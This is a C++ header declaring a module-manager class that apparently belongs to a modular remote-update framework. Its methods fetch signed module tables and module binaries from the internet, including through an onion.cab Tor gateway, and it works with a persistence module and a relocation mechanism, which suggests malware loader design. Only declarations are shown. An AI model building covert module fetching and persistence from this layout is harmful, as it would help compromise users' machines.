#pragma once
#include <Common.h>
#include <Module.h>
#include <ModuleAPI.h>
#include <Logging.h>

#include <openssl/crypto.h>
#include <openssl/ssl.h>

#include <boost/thread/mutex.hpp>

#include <protogen/manager.pb.h>
#include "ManagerInter.h"
#include <modules/persist/PersistInter.h>

namespace modules
{
  namespace manager
  {
    class ManagerModule : public modules::Module
    {
    public:
      ManagerModule();
      ~ManagerModule();

      void shutdown();

      void setModuleInterface(ModuleInterface* inter);
      void injectDependency(u32 id, void* dep);
      void releaseDependency(u32 id);

      void module_main();

      void* getPublicInterface();

      //Nonstandard

      // Blocks until the manager is done
      // managing any module files. This is so that
      // it's safe to relocate the entire thing
      // Returns if it's okay to relocate or if someone else is already doing it.
      bool prepareToRelocate();

    private:
      charlie::CModuleTable* fetchStaticModTable(charlie::CSignedBuffer** lmb=0);
      int parseModuleInfo();
      void loadStorage();
      void saveStorage();
      std::string fetchUrl(const std::string& url);
      std::string fetchStaticUrl(const std::string& url);
      std::string fetchOnionCabUrl(const std::string& url);
      int updateTableFromInternet(charlie::CModuleTable **wtbl = 0);
      void downloadModules(charlie::CModuleTable* table = 0);
      int fetchModuleFromUrl(const charlie::CModule& mod, std::string url);

      ModuleInterface* mInter;
      CManagerInfo sInfo;
      ManagerInter* pInter;
      CManagerStorage stor;
      Crypto* crypt;

      // Handles to other modules
      std::map<u32, ModuleAPI*> loadedModules;
      modules::persist::PersistInter *persist;

      // Mutex to make sure no modules relocate everything
      boost::mutex relocateMtx;
      std::string onionCabHash;

      // True if some other module has called prepareToRelocate
      bool aboutToRelocate;
    };
  };
};
